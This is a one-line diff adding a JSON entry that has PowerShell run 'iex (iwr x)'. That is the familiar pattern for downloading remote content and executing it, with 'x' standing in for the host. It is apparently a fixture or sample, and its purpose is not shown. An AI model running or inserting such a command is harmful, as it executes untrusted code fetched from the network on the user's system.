@@ -1,0 +1,1 @@
+{"command": "powershell.exe", "args": ["-NoProfile", "-Command", "iex (iwr x)"]}
